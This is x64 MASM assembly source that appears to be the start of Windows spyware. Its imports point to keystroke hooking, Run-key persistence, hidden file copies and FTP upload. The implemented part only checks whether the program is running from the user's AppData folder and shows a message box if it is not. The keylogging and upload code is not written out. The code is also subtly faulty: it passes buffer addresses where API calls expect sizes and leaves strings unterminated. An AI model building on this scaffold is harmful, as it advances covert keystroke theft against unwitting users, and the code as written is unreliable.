

includelib \masm64\lib\kernel32.lib
includelib \masm64\lib\user32.lib
includelib \masm64\lib\advapi32.lib
includelib \masm64\lib\wininet.lib
extern MessageBoxA : proc
extern ExitProcess : proc
extern GetProcessHeap :proc
extern HeapAlloc :proc
extern GetModuleFileNameA :proc
extern CreateDirectoryA :proc
extern SetFileAttributesA :proc
extern GetEnvironmentVariableA :proc
extern CopyFileA :proc
extern RegOpenKeyExA :proc
extern RegSetValueExA :proc
extern InternetOpenA :proc
extern InternetConnectA :proc
extern RegCreateKeyExA :proc
extern RegQueryValueExA :proc
extern FtpCreateDirectoryA :proc
extern CryptAcquireContextA :proc
extern CryptGenRandom :proc
extern GetSystemTime :proc
extern FtpPutFileA :proc
extern DeleteFileA :proc
extern CreateFileA :proc
extern SetWindowsHookExA :proc
extern GetMessageA :proc
extern GetForegroundWindow :proc
extern GetComputerNameExA :proc
extern GetUserNameA :proc
extern GetWindowTextA :proc
extern GetKeyboardState :proc
extern GetKeyState :proc
extern ToAscii :proc
extern GetKeyNameTextA :proc
extern WriteFile :proc
extern CallNextHookEx :proc
extern ExitProcess :proc
extern InternetCloseHandle :proc


.data
	lpfilename		db	150h dup(?)
	lpfilenamelen	db	64h dup(?)
	lpAppdata		db	'AppData', 0
	lpTargetpath	db	300h dup(?)
	lpTargetpathlen	db	10h dup(?)
	lpFilepath		db	300h dup(?)
	lpFilepathlen	dW	10h dup(?)
	msg				db	'You are not in right direction',0

.code


add_str proc ; ( rcx lpbuffer, rdx ptr str) 

	xor r10, r10
l1:
	mov al,byte ptr [rdx]
	cmp al, 0
	je ls
	mov [rcx], al
	inc rcx
	inc rdx
	jmp l1
ls:
	ret

add_str endp

cmp_str proc ; str1 rcx, str2 rdx // rax 1 = equal rax 0 = not equal
	push r9
	push r10
	xor r9, r9
	xor r9, r9
l4:
	mov r9b,byte ptr [rcx]
	mov r10b,byte ptr [rdx]
	cmp r9b, 0
	je l1
	cmp r9b, r10b
	jne l3
	inc rcx
	inc rdx
	jmp l4
l1:
	cmp r9b,0
	je l2
	jmp l3
l3:
	xor rax, rax
	pop r10
	pop r9
	ret

l2:
	mov rax, 1
	pop r10
	pop r9
	ret


cmp_str endp






start		proc
	sub		rsp, 28h
	
	; ## AM I IN APPDATA 

		;get myfile path with filename	
	xor rcx,rcx
	lea rdx, lpFilepath
	lea r8d, lpFilepathlen
	call GetModuleFileNameA
	mov r12, rax
	


		;get appdata path
	lea rcx, lpappdata
	lea rdx, lpTargetpath
	lea r8d,  lpTargetpathlen
	call GetEnvironmentVariableA 
	mov r11, rax
	

		;get filename from path but reversed version
	lea rdx, lpFilepath
	add rdx, r12
	lea rcx, lpfilename
l40:
	mov al, [rdx]
	cmp al, '\'
	je l41
	mov [rcx], al
	inc rcx
	dec rdx
	jmp l40
l41:
	

		;add filename to targetpath
	lea rdx, lpTargetpath
	add rdx, r11
	mov al, '\'
	mov [rdx], al

l50:
	inc rdx
	dec rcx
	mov al, [rcx] ;rcx last char of lpfilename
	cmp al, 0
	je l51
	mov [rdx], al
	jmp l50
l51:	
	
	lea rcx, lpTargetpath
	lea rdx, lpFilepath
	call cmp_str
	cmp rax, 0
	jne l60


	xor		r9d, r9d
	lea		r8, msg
	lea		rdx, msg
	xor		ecx, ecx
	call	MessageBoxA



l60:

	xor		ecx, ecx
	call	ExitProcess 
start	endp
end


